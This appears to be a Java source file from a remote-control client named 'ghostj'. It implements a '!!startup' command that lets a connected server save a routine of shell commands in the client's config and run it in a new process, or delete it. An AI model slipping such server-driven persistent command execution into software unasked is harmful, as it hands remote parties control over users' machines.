package com.ghostj.client.func;

import com.ghostj.client.cmd.AbstractFunc;
import com.ghostj.client.cmd.AbstractProcessor;
import com.ghostj.client.conn.HandleConn;
import com.ghostj.client.core.ClientMain;
import com.ghostj.client.util.Out;

public class FuncStartup implements AbstractFunc {
    @Override
    public String getFuncName() {
        return "!!startup";
    }

    @Override
    public String[] getParamsModel() {
        return new String[0];
    }

    @Override
    public String getDescription() {
        return null;
    }

    @Override
    public int getMinParamsAmount() {
        return 0;
    }

    @Override
    public void run(String[] params, String cmd, AbstractProcessor processor) {

        //运行启动任务
        if (ClientMain.config.field.containsKey("startupRoutine")&&params.length==0){
            try {
                processor.start("!!proc new startup");
                Thread.sleep(1000);
                FuncDefault.focusedProcess.processWriter.write(ClientMain.config.getStringValue("startupRoutine").replaceAll("\\\\n","\n")+"\nexit");
                FuncDefault.focusedProcess.processWriter.newLine();
                FuncDefault.focusedProcess.processWriter.flush();
                FuncDefault.focusedProcess=null;
            } catch (Exception e) {
                System.out.println("failed to run startupRoutine");
                e.printStackTrace();
            }
        }else if (params.length>=1){
            switch (params[0]){
                case "set":{
                    if (params.length>1){
                        ClientMain.config.set("startupRoutine",cmd.substring(14));
                        ClientMain.config.write();
                        HandleConn.writeToServerIgnoreException("设置启动项:"+ClientMain.config.getStringValue("startupRoutine"));
                    }else {
                        HandleConn.writeToServerIgnoreException("命令语法不正确");
                    }
                    break;
                }
                case "rm":{
                    ClientMain.config.remove("startupRoutine");
                    ClientMain.config.write();
                    HandleConn.writeToServerIgnoreException("删除启动项");
                    break;
                }
            }
        }
    }
}
